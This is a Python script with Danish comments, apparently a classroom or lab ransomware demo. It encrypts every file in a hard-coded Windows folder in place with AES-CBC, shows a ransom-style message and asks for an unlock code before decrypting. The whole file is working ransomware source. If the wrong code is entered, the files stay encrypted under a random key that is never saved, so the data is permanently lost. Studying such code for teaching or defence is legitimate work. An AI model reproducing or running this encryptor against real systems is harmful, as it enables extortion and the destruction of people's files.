from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes
import os

# key = get_random_bytes(16)
#Nøgle der bruges til at kryptere og dekryptere(skal være i bytes for AES.CBC)
unlockcode = "sesam"
#16 byte nøgle til kryptering
key = get_random_bytes(16)
#directory der bliver angrebet
target_dir = "C:/Users/maflp/Desktop/Ransomware/ReallyImportant"

def get_files():
    #en liste med de filer der bliver hentet
    target_files = []
    #for statement der henter fil navn
    for file in os.listdir(target_dir):
        #sikkerhedstop der springer ransomwaren over hvis den bliver scannet af for statement
        if file == "Ransom2.py":
            continue
        #fil stien bliver lagt sammen med fil navn
        file_path = os.path.join(target_dir, file)
        #check om de filer der er blevet hentet er filer og hvis ja
        #så bliver stien renset fra \\ til / så python kan læse stien
        #derefter bliver filerne appended til listen som skal være filerne der bliver angrebet
        if os.path.isfile(file_path):
            cleaned_files = file_path.replace("\\","/")
            target_files.append(cleaned_files)
    return target_files

#Metode til at kryptere en fil
def encrypt(filename):
    #nøgle og kryptering modul valg
    cipher = AES.new(key, AES.MODE_CBC)
    #åbning af data inde i en fil
    with open(filename, "rb") as file:
        data = file.read()
    #padding bliver tilføjet til fil
    ciphertext_bytes = cipher.encrypt(pad(data, AES.block_size))

    #iv og data bliver lagt sammen
    encrypted_data = cipher.iv + ciphertext_bytes

    #krypteret data bliver skrevet til fil
    with open(filename, "wb") as file:
        file.write(encrypted_data)

#dekryptering af fil
def decrypt(filename):
    #åbning af data i en fil
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    #iv bliver valgt fra byte 1 - 16
    inv = encrypted_data[:AES.block_size]
    #cypher text bliver valgt fra byte 17 og frem
    cyt = encrypted_data[AES.block_size:]
    #cipher bliver sat med nøgle, modul og iv
    cipher = AES.new(key, AES.MODE_CBC, iv = inv)
    #padded tekst bliver unpadded og dekrypteret
    pt = unpad(cipher.decrypt(cyt), AES.block_size)
    #det dekrypterede data bliver skrevet til filen
    with open(filename, "wb") as file:
        encrypted_data = file.write(pt)

#metode til at kryptere filer der kalder på ovenstående metoder
#files er en liste med filerne fra directoriet
#for hver file i files bliver dataen krypteret
def encrypt_files():
    files = get_files()
    for file in files:
        encrypt(file)
        print("file encrypted: ", file)
#metode til at dekryptere filer der kalder på ovenstående metoder
#files er en liste med filerne fra directoriet
#for hver file i files bliver dataen dekrypteret
def dencrypt_files():
    files = get_files()
    for file in files:
        decrypt(file)
        print("file decrypted: ", file)

#verbose for at se de filer der er valgt til kryptering
print(get_files())
#verbose til at vise nøgle
print(key)

#stopklods i tilfælde af nogle af de valgte filer ikke skal krypteres
input("press to continue")

#encrypt_files bliver kaldt for at kryptere de valgte filer
encrypt_files()

#verbose stopklods for at sige filer er blevet krypteret
input("oh no! your files have been encrypted!!")

#skriv hemmelig kode for at dekryptere filer
unlock = input("please type the key to unlock your files: ")

#if/else for enten at afvise kode eller dekryptere filerne hvis koden er rigtig
if unlock != unlockcode:
    print("oops! wrong code")
else:
    dencrypt_files()

